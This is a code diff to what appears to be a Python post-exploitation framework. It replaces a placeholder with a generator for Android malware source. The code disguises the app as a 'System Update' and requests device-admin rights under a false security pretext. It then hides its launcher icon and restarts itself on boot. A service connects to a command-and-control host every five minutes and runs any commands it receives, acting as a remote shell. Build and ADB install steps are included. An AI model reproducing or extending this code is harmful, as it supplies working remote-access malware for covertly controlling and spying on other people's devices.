@@ -265,13 +265,283 @@ done &
         return payload
     
     def _generate_malicious_apk(self, host: CompromisedHost,
-                              session: PersistenceSession, 
+                              session: PersistenceSession,
                               app_name: str) -> bytes:
-        """Generate malicious Android APK (placeholder)"""
-        # In a real implementation, this would generate a proper Android APK
-        # with embedded payload and persistence mechanisms
+        """Generate malicious Android APK with embedded payload"""
         logger.info(f"Generating malicious APK for {app_name}")
-        return b"APK_PLACEHOLDER"
+
+        c2_server = session.c2_servers[0] if session.c2_servers else "127.0.0.1:4444"
+        host_ip, port = c2_server.split(':')
+
+        # Generate Android manifest
+        manifest_xml = f'''<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="{app_name}"
+    android:versionCode="1"
+    android:versionName="1.0">
+
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.DEVICE_ADMIN" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="System Update"
+        android:theme="@style/AppTheme">
+
+        <activity
+            android:name=".MainActivity"
+            android:label="System Update">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name=".PersistenceService"
+            android:enabled="true"
+            android:exported="false" />
+
+        <receiver
+            android:name=".BootReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter android:priority="1000">
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.PACKAGE_REPLACED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name=".AdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>'''
+
+        # Generate MainActivity Java source
+        main_activity_java = f'''package {app_name};
+
+import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.widget.Toast;
+
+public class MainActivity extends Activity {{
+    private DevicePolicyManager devicePolicyManager;
+    private ComponentName adminComponent;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {{
+        super.onCreate(savedInstanceState);
+
+        // Initialize device admin
+        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
+        adminComponent = new ComponentName(this, AdminReceiver.class);
+
+        // Request device admin privileges
+        if (!devicePolicyManager.isAdminActive(adminComponent)) {{
+            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
+            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "System security update required");
+            startActivityForResult(intent, 1);
+        }}
+
+        // Start persistence service
+        Intent serviceIntent = new Intent(this, PersistenceService.class);
+        startService(serviceIntent);
+
+        // Hide from launcher after first run
+        getPackageManager().setComponentEnabledSetting(
+            new ComponentName(this, MainActivity.class),
+            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            android.content.pm.PackageManager.DONT_KILL_APP
+        );
+
+        Toast.makeText(this, "System update completed", Toast.LENGTH_SHORT).show();
+        finish();
+    }}
+}}'''
+
+        # Generate PersistenceService Java source
+        service_java = f'''package {app_name};
+
+import android.app.Service;
+import android.content.Intent;
+import android.os.IBinder;
+import java.io.*;
+import java.net.*;
+import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
+import java.util.concurrent.TimeUnit;
+
+public class PersistenceService extends Service {{
+    private ScheduledExecutorService scheduler;
+    private static final String C2_HOST = "{host_ip}";
+    private static final int C2_PORT = {port};
+
+    @Override
+    public void onCreate() {{
+        super.onCreate();
+        scheduler = Executors.newSingleThreadScheduledExecutor();
+        startPersistentConnection();
+    }}
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {{
+        return START_STICKY; // Restart if killed
+    }}
+
+    @Override
+    public IBinder onBind(Intent intent) {{
+        return null;
+    }}
+
+    private void startPersistentConnection() {{
+        scheduler.scheduleWithFixedDelay(new Runnable() {{
+            @Override
+            public void run() {{
+                try {{
+                    connectToC2();
+                }} catch (Exception e) {{
+                    // Silently retry
+                }}
+            }}
+        }}, 0, 300, TimeUnit.SECONDS); // Every 5 minutes
+    }}
+
+    private void connectToC2() throws Exception {{
+        Socket socket = new Socket();
+        socket.connect(new InetSocketAddress(C2_HOST, C2_PORT), 10000);
+
+        BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+        PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);
+
+        // Send device info
+        writer.println("ANDROID_DEVICE:" + android.os.Build.MODEL);
+
+        String command;
+        while ((command = reader.readLine()) != null) {{
+            try {{
+                Process process = Runtime.getRuntime().exec(command);
+                BufferedReader cmdReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+                String line;
+                while ((line = cmdReader.readLine()) != null) {{
+                    writer.println(line);
+                }}
+                writer.println("CMD_COMPLETE");
+            }} catch (Exception e) {{
+                writer.println("ERROR: " + e.getMessage());
+            }}
+        }}
+
+        socket.close();
+    }}
+}}'''
+
+        # Generate BootReceiver Java source
+        boot_receiver_java = f'''package {app_name};
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+public class BootReceiver extends BroadcastReceiver {{
+    @Override
+    public void onReceive(Context context, Intent intent) {{
+        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
+            Intent.ACTION_MY_PACKAGE_REPLACED.equals(intent.getAction())) {{
+
+            // Start persistence service on boot
+            Intent serviceIntent = new Intent(context, PersistenceService.class);
+            context.startService(serviceIntent);
+        }}
+    }}
+}}'''
+
+        # Generate AdminReceiver Java source
+        admin_receiver_java = f'''package {app_name};
+
+import android.app.admin.DeviceAdminReceiver;
+import android.content.Context;
+import android.content.Intent;
+
+public class AdminReceiver extends DeviceAdminReceiver {{
+    @Override
+    public void onEnabled(Context context, Intent intent) {{
+        super.onEnabled(context, intent);
+        // Device admin enabled - start persistence
+        Intent serviceIntent = new Intent(context, PersistenceService.class);
+        context.startService(serviceIntent);
+    }}
+
+    @Override
+    public void onDisabled(Context context, Intent intent) {{
+        super.onDisabled(context, intent);
+        // Try to re-enable admin privileges
+        // In a real implementation, this would attempt to regain admin access
+    }}
+}}'''
+
+        # Combine all source files into a single payload
+        apk_source = f"""
+# Android Malicious APK Source Code
+# Package: {app_name}
+# Target: {host.ip_address}
+# C2 Server: {c2_server}
+
+## AndroidManifest.xml
+{manifest_xml}
+
+## MainActivity.java
+{main_activity_java}
+
+## PersistenceService.java
+{service_java}
+
+## BootReceiver.java
+{boot_receiver_java}
+
+## AdminReceiver.java
+{admin_receiver_java}
+
+## Build Instructions:
+# 1. Create Android project with package name: {app_name}
+# 2. Replace default files with above source code
+# 3. Add device_admin.xml to res/xml/ directory
+# 4. Build APK: ./gradlew assembleRelease
+# 5. Sign APK with debug key or custom certificate
+# 6. Install via ADB: adb install {app_name}.apk
+
+## Compilation Commands:
+# mkdir -p android_project/app/src/main/java/{app_name.replace('.', '/')}
+# echo '{manifest_xml}' > android_project/app/src/main/AndroidManifest.xml
+# echo '{main_activity_java}' > android_project/app/src/main/java/{app_name.replace('.', '/')}/MainActivity.java
+# echo '{service_java}' > android_project/app/src/main/java/{app_name.replace('.', '/')}/PersistenceService.java
+# echo '{boot_receiver_java}' > android_project/app/src/main/java/{app_name.replace('.', '/')}/BootReceiver.java
+# echo '{admin_receiver_java}' > android_project/app/src/main/java/{app_name.replace('.', '/')}/AdminReceiver.java
+# cd android_project && ./gradlew assembleRelease
+"""
+
+        return apk_source.encode('utf-8')
     
     def _check_adb_connection(self, host: CompromisedHost) -> bool:
         """Check if ADB connection is available"""
